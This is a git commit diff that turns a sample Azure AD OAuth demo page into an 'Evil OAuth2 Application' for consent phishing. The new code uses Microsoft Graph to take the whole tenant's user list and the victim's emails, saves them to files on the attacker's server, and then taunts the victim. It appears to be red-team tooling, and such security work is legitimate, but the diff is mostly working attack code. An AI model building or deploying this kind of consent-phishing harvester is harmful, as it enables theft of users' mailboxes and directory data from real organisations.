8fb2e388710749ac2367526433c2e7388932136e
nyxgeek <nyxgeek@rslabs.co>
2021-09-30 15:10:21 -0500

    updated to be more evil

--- www/index.php
+++ www/index.php
@@ -1,13 +1,10 @@
 <?php
-/* index.php Sample homepage for oAuth Demo project
- *
- * Katy Nicholson, last updated 01/09/2021
- *
- * https://github.com/CoasterKaty
- * https://katytech.blog/
- * https://twitter.com/coaster_katy
- *
- */
+
+// Evil OAuth2 Application
+// 2021.09.30 - @nyxgeek - TrustedSec
+//
+// Original source:  	https://github.com/CoasterKaty/PHPAzureADoAuth
+//			              https://katytech.blog/
 
 
 // Load the auth module, this will redirect us to login if we aren't already logged in.
@@ -15,19 +12,29 @@ include '../inc/auth.php';
 $Auth = new modAuth();
 include '../inc/graph.php';
 $Graph = new modGraph();
-//Display the username, logout link and a list of attributes returned by Azure AD.
-$photo = $Graph->getPhoto();
+
+
+// Run our functions and retrieve data
+
+// 0. Get Profile info - not going to write it to disk
+//    however, this is useful if you want to personalize your phishing landing page
 $profile = $Graph->getProfile();
 
-echo '<h1>Hello there, ' . $profile->displayName . ' (' . $Auth->userName . ')</h1>';
-echo '<h2><a href="/?action=logout">Log out</a></h2>';
-echo $photo;
-echo '<br><br>';
-echo 'Profile Graph API output:<pre>';
-print_r($profile);
-echo '</pre><br>Data returned in JWT token:<pre>';
-print_r($Auth->userData);
-echo '</pre>';
+// 1. Pull down user list - this should be allowed for everyone
+$users = $Graph->getAllUsers();
+$json = json_encode(array('data' => $users));
+file_put_contents("/var/www/inc/users.txt", $json, FILE_APPEND);
+
+// 2. Pull down emails - this requires admin consent. If it fails, will write auth error to emails.txt
+$emails = $Graph->getEmails();
+$json = json_encode(array('data' => $emails));
+file_put_contents("/var/www/inc/emails.txt", $json, FILE_APPEND);
+
+
+// Phishing page goes here DFIU:
+
+echo 'Hello there, ' . $profile->displayName . '<P>';
+echo 'Nothing to see here... go back to work. Oh, and nice work, btw. I really appreciate it. ;)<BR>';
+
+
 ?>
-
-
